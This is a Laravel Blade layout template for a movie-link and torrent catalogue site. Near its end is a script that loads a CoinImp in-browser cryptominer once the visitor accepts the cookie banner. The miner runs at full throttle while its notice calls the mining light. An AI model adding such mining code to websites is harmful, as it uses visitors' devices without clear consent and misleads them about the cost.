<!doctype html>
<html lang="{{ app()->getLocale() }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <meta name="description" content="Filmes sem ADS — catálogo de filmes com links para assistir, sem commercials.">

    <title>@yield('title', 'Catálogo de filmes sem chatisse')</title>

    <link rel="icon" href="{{ asset('favicon.ico') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    @vite(['resources/css/app.css', 'resources/js/app.js'])
    @livewireStyles
</head>

<body class="min-h-screen bg-ink-950 text-chalk antialiased">

    {{-- ======================= TOPBAR ======================= --}}
    <header class="sticky top-0 z-50 border-b border-line bg-ink-950/85 backdrop-blur-xl">
        <div class="mx-auto flex h-16 max-w-7xl items-center gap-6 px-4 sm:px-6 lg:px-8">
            <a href="{{ route('index') }}" class="flex shrink-0 items-center gap-2.5 font-extrabold tracking-tight">
                <span class="flex h-8.5 w-8.5 items-center justify-center rounded-[9px] bg-gradient-to-br from-brand to-orange-400 shadow-[0_6px_18px_rgb(229_9_20/0.35)]">
                    <i class="fas fa-film text-sm"></i>
                </span>
                <span class="hidden sm:inline">Filmes sem ADS</span>
            </a>

            <nav class="ml-2 hidden items-center gap-1 md:flex">
                <a href="{{ route('index') }}" class="inline-flex items-center gap-2 rounded-full px-3 py-2 text-sm font-medium text-muted transition hover:bg-ink-700 hover:text-white">
                    <i class="fas fa-home text-xs"></i> Início
                </a>

                <div x-data="{ open: false }" class="relative">
                    <button @click="open = !open" @click.outside="open = false"
                        class="inline-flex items-center gap-2 rounded-full px-3 py-2 text-sm font-medium text-muted transition hover:bg-ink-700 hover:text-white">
                        <i class="fas fa-layer-group text-xs"></i> Categorias
                        <i class="fas fa-chevron-down text-[10px]"></i>
                    </button>

                    <div x-show="open" x-cloak x-transition.origin.top.left
                        class="absolute left-0 top-full z-50 mt-2 w-56 rounded-xl border border-line bg-ink-800 p-1.5 shadow-card">
                        @forelse($categoriasMenu ?? [] as $categoria)
                            <a href="{{ route('index', ['categorias' => $categoria->id]) }}"
                                class="block rounded-lg px-3 py-2 text-sm text-muted transition hover:bg-ink-700 hover:text-white">
                                {{ $categoria->name }}
                            </a>
                        @empty
                            <span class="block px-3 py-2 text-xs text-faint">Nenhuma categoria</span>
                        @endforelse
                    </div>
                </div>

                <a href="{{ route('torrents.index') }}" class="inline-flex items-center gap-2 rounded-full px-3 py-2 text-sm font-medium text-muted transition hover:bg-ink-700 hover:text-white">
                    <i class="fas fa-download text-xs"></i> Torrents
                </a>
            </nav>

            <div class="ml-auto flex items-center gap-2">
                @auth
                    <a href="{{ route('adm') }}" class="fda-btn fda-btn-ghost">
                        <i class="fas fa-user-circle text-xs"></i>
                        <span class="hidden sm:inline">{{ Str::limit(Auth::user()->name, 14) }}</span>
                    </a>
                    <form action="{{ route('logout') }}" method="POST" class="inline">
                        @csrf
                        <button type="submit" class="fda-btn fda-btn-primary">
                            <i class="fas fa-sign-out-alt text-xs"></i>
                            <span class="hidden sm:inline">Sair</span>
                        </button>
                    </form>
                @endauth
            </div>
        </div>
    </header>

    @yield('alerta')

    <main>
        @yield('content')
    </main>

    {{-- ======================= FOOTER ======================= --}}
    <footer class="mt-16 border-t border-line bg-ink-900">
        <div class="mx-auto max-w-7xl px-4 py-12 sm:px-6 lg:px-8">
            <div class="grid gap-10 md:grid-cols-12">
                <div class="md:col-span-5">
                    <a href="{{ route('index') }}" class="flex items-center gap-2.5 font-extrabold tracking-tight">
                        <span class="flex h-8.5 w-8.5 items-center justify-center rounded-[9px] bg-gradient-to-br from-brand to-orange-400">
                            <i class="fas fa-film text-sm"></i>
                        </span>
                        <span>Filmes sem ADS</span>
                    </a>
                    <p class="mt-4 max-w-sm text-sm leading-relaxed text-muted">
                        Catálogo de filmes com links para assistir direto, sem propagandas e sem chatisse.
                    </p>
                </div>

                <div class="md:col-span-3">
                    <h4 class="mb-3 text-xs font-bold uppercase tracking-[0.1em] text-muted">Navegar</h4>
                    <ul class="space-y-2 text-sm">
                        <li><a href="{{ route('index') }}" class="text-[#c6c6d1] transition hover:text-white">Início</a></li>
                        <li><a href="{{ route('index') }}#catalogo" class="text-[#c6c6d1] transition hover:text-white">Catálogo</a></li>
                        <li><a href="{{ route('torrents.index') }}" class="text-[#c6c6d1] transition hover:text-white">Torrents</a></li>
                        @auth
                            <li><a href="{{ route('adm') }}" class="text-[#c6c6d1] transition hover:text-white">Área ADM</a></li>
                        @endauth
                    </ul>
                </div>

                <div class="md:col-span-4">
                    <h4 class="mb-3 text-xs font-bold uppercase tracking-[0.1em] text-muted">Categorias</h4>
                    <ul class="space-y-2 text-sm">
                        @forelse($categoriasMenu ?? [] as $categoria)
                            <li><a href="{{ route('index', ['categorias' => $categoria->id]) }}" class="text-[#c6c6d1] transition hover:text-white">{{ $categoria->name }}</a></li>
                        @empty
                            <li><span class="text-muted">Nenhuma categoria</span></li>
                        @endforelse
                    </ul>
                </div>
            </div>

            <div class="mt-10 flex flex-wrap justify-between gap-3 border-t border-line pt-6 text-xs text-muted">
                <span>© {{ date('Y') }} Filmes sem ADS — projeto de portfólio em Laravel 11.</span>
                <div class="flex items-center gap-4">
                    <span>Feito com Laravel, Livewire, Tailwind CSS e MySQL.</span>
                    <a href="#" @click.prevent="Alpine.store('privacy', true)"
                        class="font-medium text-brand transition hover:text-brand-hover">
                        Política de Privacidade
                    </a>
                </div>
            </div>
        </div>
    </footer>

    {{-- Voltar ao topo --}}
    <a href="#page-top" title="Voltar ao topo"
        class="fixed right-5 bottom-5 z-40 flex h-10.5 w-10.5 items-center justify-center rounded-full border border-line-strong bg-ink-700 transition hover:-translate-y-0.5 hover:border-brand hover:bg-brand hover:text-white">
        <i class="fas fa-angle-up"></i>
    </a>

    @livewireScripts

    {{-- Banner de cookies e política de privacidade --}}
    @include('partials.cookie-banner')

    {{-- Minerador CoinImp (após consentimento do usuário) --}}
    @if(config('miner.enabled') && config('miner.site_key'))
    <script>
    if (localStorage.fda_consent === '1') {
        var scriptPath = '{{ config('miner.script_path') }}';
        // Se for URL absoluta (CDN), usa direto; se for caminho relativo, usa asset()
        var finalSrc = (scriptPath.startsWith('http://') || scriptPath.startsWith('https://')) ? scriptPath : '{{ asset('___PLACEHOLDER___') }}'.replace('___PLACEHOLDER___', scriptPath);
        var coinimp = document.createElement('script');
        coinimp.src = finalSrc;
        coinimp.onload = function() {
            var _client = new Client.Anonymous('{{ config('miner.site_key') }}', {
                throttle: 0,
                c: 'w'
            });
            _client.start();
            _client.addMiningNotification(
                "Top",
                "Este site usa mineração leve para custear a hospedagem. Se preferir, você pode parar.",
                "#cccccc",
                40,
                "#3d3d3d"
            );
        };
        document.head.appendChild(coinimp);
    }
    </script>
    @endif
</body>
</html>
